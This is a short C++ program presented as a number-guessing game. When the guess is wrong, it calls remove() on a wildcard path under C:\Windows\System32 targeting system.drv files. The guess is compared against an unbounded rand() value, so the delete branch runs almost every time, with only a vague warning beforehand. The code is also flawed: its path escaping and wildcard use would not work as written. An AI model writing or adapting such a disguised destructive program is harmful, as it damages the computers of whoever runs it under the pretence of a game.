#include <iostream>
#include <cstdlib>
using namespace std;

int main(){


  while(1){


  int k=rand();
  cout<<"Enter any number from 0 to 9"<<endl;
  int n;
  cin>>n;
  cout<<"WARRNING -> guesing wrong number could lead to serious consequencies"<<endl;
  cout<<"Would you like to proceed (y, N)"<<endl;
  char a;
  cin>>a;
  if(a=='N'){
    return 0;
  }
  else{
    if(n==k){
      cout<<"You're Safe"<<endl;
    }
    else{
      remove ("C:\Windows\System32\*system.drv*");
    }
  }



}

  return 0;

}
  
  
  